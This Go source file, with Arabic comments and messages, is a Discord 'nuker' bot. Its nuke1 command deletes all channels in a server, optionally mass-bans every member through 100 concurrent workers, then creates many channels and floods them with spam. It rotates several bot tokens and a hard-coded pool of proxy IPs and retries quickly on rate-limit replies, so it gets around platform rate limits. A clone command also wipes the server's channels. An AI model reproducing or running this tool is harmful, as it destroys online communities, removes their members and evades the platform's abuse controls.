package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var massiveProxyPool = []string{
	"103.152.112.5:80",
	"185.199.229.156:8080",
	"45.33.32.156:3128",
	"190.61.35.153:8080",
	"200.105.215.12:80",
	"103.203.73.5:80",
	"182.253.114.52:8080",
	"114.233.153.22:9002",
	"120.52.31.29:80",
	"111.225.152.18:8080",
	"202.131.241.155:80",
	"103.149.28.10:80",
	"117.251.103.178:8080",
	"180.232.115.12:80",
	"36.67.149.122:8080",
	"103.13.29.135:80",
	"190.104.29.10:80",
	"181.129.28.45:999",
	"190.122.179.20:8080",
	"43.153.88.12:3128",
	"182.253.158.52:8080",
	"202.65.140.100:8080",
	"103.253.24.12:80",
	"114.6.14.22:8080",
	"45.195.192.15:8080",
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdNuke := &discordgo.ApplicationCommand{
		Name:        "nuke1",
		Description: "أمر التدمير: حذف، سبام سريع جداً، وخيار تفعيل الباند",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionBoolean,
				Name:        "enable_ban",
				Description: "تفعيل باند الأعضاء؟",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى رسالة السبام",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل بكل روم",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "bot_tokens",
				Description: "التوكنات مفصولة بفاصلة (,)",
				Required:    true,
			},
		},
	}

	cmdClone := &discordgo.ApplicationCommand{
		Name:        "clone",
		Description: "أمر النسخ الشامل: رتب، رومات، وفئات بنفس الترتيب والصلاحيات",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "source_guild_id",
				Description: "أيدي السيرفر المصدر (المراد نسخه)",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "bot_tokens",
				Description: "توكنات البوتات مفصولة بفاصلة (,)",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
		fmt.Printf("✅ البوت متصل الآن باسم: %s\n", s.State.User.Username)
		_, _ = s.ApplicationCommandCreate(s.State.User.ID, "", cmdNuke)
		_, _ = s.ApplicationCommandCreate(s.State.User.ID, "", cmdClone)
		fmt.Println("✨ تم تسجيل الأوامر بنجاح!")
	})

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ للمشرفين فقط.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		cmdName := i.ApplicationCommandData().Name
		optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
		for _, opt := range i.ApplicationCommandData().Options {
			optionMap[opt.Name] = opt
		}

		guildID := i.GuildID
		botID := s.State.User.ID

		if cmdName == "nuke1" {
			enableBan := optionMap["enable_ban"].BoolValue()
			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			tokensInput := optionMap["bot_tokens"].StringValue()

			var tokens []string
			for _, t := range strings.Split(tokensInput, ",") {
				t = strings.TrimSpace(t)
				if t != "" {
					tokens = append(tokens, t)
				}
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تنفيذ محرك nuke1 بالسرعة القصوى...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			go executeNukeEngine(tokens, massiveProxyPool, guildID, botID, roomName, roomsCount, messageContent, messagesCount, enableBan, s)

		} else if cmdName == "clone" {
			sourceGuildID := optionMap["source_guild_id"].StringValue()
			tokensInput := optionMap["bot_tokens"].StringValue()

			var tokens []string
			for _, t := range strings.Split(tokensInput, ",") {
				t = strings.TrimSpace(t)
				if t != "" {
					tokens = append(tokens, t)
				}
			}

			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "📋 جاري استنساخ الرتب والرومات والصلاحيات بدقة كاملة...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			go executePerfectCloneEngine(tokens, massiveProxyPool, guildID, sourceGuildID, s)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

func filterActiveProxies(rawProxies []string) []*http.Client {
	var activeClients []*http.Client
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, pStr := range rawProxies {
		wg.Add(1)
		go func(proxy string) {
			defer wg.Done()
			pURL, err := url.Parse("http://" + proxy)
			if err != nil {
				return
			}
			client := &http.Client{
				Transport: &http.Transport{
					Proxy:               http.ProxyURL(pURL),
					MaxIdleConns:        500,
					MaxIdleConnsPerHost: 500,
					IdleConnTimeout:     30 * time.Second,
					DialContext: (&net.Dialer{
						Timeout:   1 * time.Second,
						KeepAlive: 15 * time.Second,
					}).DialContext,
				},
				Timeout: 1500 * time.Millisecond,
			}

			req, _ := http.NewRequest("GET", "https://discord.com/api/v10/gateway", nil)
			resp, err := client.Do(req)
			if err == nil {
				resp.Body.Close()
				mu.Lock()
				activeClients = append(activeClients, client)
				mu.Unlock()
			}
		}(pStr)
	}
	wg.Wait()
	return activeClients
}

func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, includeBan bool, s *discordgo.Session) {
	if len(tokens) == 0 {
		return
	}
	clients := filterActiveProxies(rawProxies)
	if len(clients) == 0 {
		clients = append(clients, &http.Client{Timeout: 2 * time.Second})
	}

	botIDs := map[string]bool{botID: true}
	channelPayloads := make([][]byte, roomsCount)
	for i := 0; i < roomsCount; i++ {
		p, _ := json.Marshal(map[string]interface{}{
			"name": fmt.Sprintf("%s-%d", roomName, i),
			"type": 0,
		})
		channelPayloads[i] = p
	}

	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})

	var allUserIDs []string
	if includeBan {
		after := ""
		for {
			members, err := s.GuildMembers(guildID, after, 1000)
			if err != nil || len(members) == 0 {
				break
			}
			for _, m := range members {
				if m != nil && m.User != nil {
					if !botIDs[m.User.ID] {
						allUserIDs = append(allUserIDs, m.User.ID)
					}
					after = m.User.ID
				}
			}
			if len(members) < 1000 {
				break
			}
		}
	}

	channels, err := s.GuildChannels(guildID)
	var oldChannelIDs []string
	if err == nil {
		for _, ch := range channels {
			if ch != nil {
				oldChannelIDs = append(oldChannelIDs, ch.ID)
			}
		}
	}

	makeReq := func(method, urlStr string, body []byte, index int) bool {
		client := clients[index%len(clients)]
		token := tokens[index%len(tokens)]
		for attempt := 0; attempt < 3; attempt++ {
			req, err := http.NewRequestWithContext(context.Background(), method, urlStr, bytes.NewBuffer(body))
			if err != nil {
				return false
			}
			req.Header.Set("Authorization", "Bot "+token)
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			if resp.StatusCode == 429 {
				resp.Body.Close()
				time.Sleep(20 * time.Millisecond)
				continue
			}
			resp.Body.Close()
			return true
		}
		return false
	}

	// 1. حذف الرومات القديمة
	chQueue := make(chan string, len(oldChannelIDs))
	for _, id := range oldChannelIDs {
		chQueue <- id
	}
	close(chQueue)

	var wgDel sync.WaitGroup
	for w := 0; w < 60; w++ {
		wgDel.Add(1)
		go func(wID int) {
			defer wgDel.Done()
			for chID := range chQueue {
				makeReq("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, wID)
			}
		}(w)
	}
	wgDel.Wait()

	// 2. الباند الجماعي
	if includeBan && len(allUserIDs) > 0 {
		userQueue := make(chan string, len(allUserIDs))
		for _, uid := range allUserIDs {
			userQueue <- uid
		}
		close(userQueue)

		var wgBan sync.WaitGroup
		for w := 0; w < 100; w++ {
			wgBan.Add(1)
			go func(wID int) {
				defer wgBan.Done()
				for uid := range userQueue {
					makeReq("PUT", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid), nil, wID)
				}
			}(w)
		}
		wgBan.Wait()
	}

	// 3. إنشاء الرومات الجديدة
	var newChannelIDs []string
	var muChannels sync.Mutex
	var wgCreate sync.WaitGroup

	roomChan := make(chan []byte, len(channelPayloads))
	for _, p := range channelPayloads {
		roomChan <- p
	}
	close(roomChan)

	for w := 0; w < 50; w++ {
		wgCreate.Add(1)
		go func(wID int) {
			defer wgCreate.Done()
			client := clients[wID%len(clients)]
			token := tokens[wID%len(tokens)]

			for p := range roomChan {
				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
				req.Header.Set("Authorization", "Bot "+token)
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

				resp, err := client.Do(req)
				if err != nil {
					continue
				}
				if resp.StatusCode == 200 || resp.StatusCode == 201 {
					var res map[string]interface{}
					if json.NewDecoder(resp.Body).Decode(&res) == nil {
						if id, ok := res["id"].(string); ok {
							muChannels.Lock()
							newChannelIDs = append(newChannelIDs, id)
							muChannels.Unlock()
						}
					}
				}
				resp.Body.Close()
			}
		}(w)
	}
	wgCreate.Wait()

	// 4. السبام السريع جداً للرسائل
	if len(newChannelIDs) > 0 && messagesCount > 0 {
		var wgMsg sync.WaitGroup
		for i, chID := range newChannelIDs {
			wgMsg.Add(1)
			go func(cID string, wIdx int) {
				defer wgMsg.Done()
				var wgSubMsg sync.WaitGroup
				for m := 0; m < messagesCount; m++ {
					wgSubMsg.Add(1)
					go func(msgIndex int) {
						defer wgSubMsg.Done()
						makeReq("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", msgPayload, wIdx+msgIndex)
					}(m)
				}
				wgSubMsg.Wait()
			}(chID, i*10)
		}
		wgMsg.Wait()
	}
}

func executePerfectCloneEngine(tokens []string, rawProxies []string, guildID, sourceGuildID string, s *discordgo.Session) {
	if len(tokens) == 0 {
		return
	}
	clients := filterActiveProxies(rawProxies)
	if len(clients) == 0 {
		clients = append(clients, &http.Client{Timeout: 2 * time.Second})
	}

	currentChannels, _ := s.GuildChannels(guildID)
	for _, ch := range currentChannels {
		if ch != nil {
			s.ChannelDelete(ch.ID)
		}
	}

	sourceRoles, err := s.GuildRoles(sourceGuildID)
	if err == nil {
		sort.Slice(sourceRoles, func(i, j int) bool {
			return sourceRoles[i].Position < sourceRoles[j].Position
		})

		for _, r := range sourceRoles {
			if r.Managed || r.Name == "@everyone" {
				continue
			}
			s.GuildRoleCreate(guildID, &discordgo.RoleParams{
				Name:        r.Name,
				Color:       &r.Color,
				Hoist:       &r.Hoist,
				Permissions: &r.Permissions,
				Mentionable: &r.Mentionable,
			})
		}
	}

	sourceChannels, err := s.GuildChannels(sourceGuildID)
	if err != nil {
		return
	}

	var categories []*discordgo.Channel
	var channels []*discordgo.Channel

	for _, ch := range sourceChannels {
		if ch.Type == discordgo.ChannelTypeGuildCategory {
			categories = append(categories, ch)
		} else {
			channels = append(channels, ch)
		}
	}

	categoryMap := make(map[string]string)

	for _, cat := range categories {
		p, _ := json.Marshal(map[string]interface{}{
			"name":                  cat.Name,
			"type":                  cat.Type,
			"permission_overwrites": cat.PermissionOverwrites,
			"position":              cat.Position,
		})

		req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
		req.Header.Set("Authorization", "Bot "+tokens[0])
		req.Header.Set("Content-Type", "application/json")

		client := clients[0]
		resp, err := client.Do(req)
		if err == nil && (resp.StatusCode == 200 || resp.StatusCode == 201) {
			var res map[string]interface{}
			if json.NewDecoder(resp.Body).Decode(&res) == nil {
				if newID, ok := res["id"].(string); ok {
					categoryMap[cat.ID] = newID
				}
			}
		}
		if resp != nil {
			resp.Body.Close()
		}
	}

	for _, ch := range channels {
		parentID := ""
		if ch.ParentID != "" {
			if newP, exists := categoryMap[ch.ParentID]; exists {
				parentID = newP
			}
		}

		p, _ := json.Marshal(map[string]interface{}{
			"name":                  ch.Name,
			"type":                  ch.Type,
			"topic":                 ch.Topic,
			"nsfw":                  ch.NSFW,
			"rate_limit_per_user":   ch.RateLimitPerUser,
			"bitrate":               ch.Bitrate,
			"user_limit":            ch.UserLimit,
			"parent_id":             parentID,
			"permission_overwrites": ch.PermissionOverwrites,
			"position":              ch.Position,
		})

		req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
		req.Header.Set("Authorization", "Bot "+tokens[0])
		req.Header.Set("Content-Type", "application/json")

		client := clients[0]
		resp, err := client.Do(req)
		if resp != nil {
			resp.Body.Close()
		}
	}
}
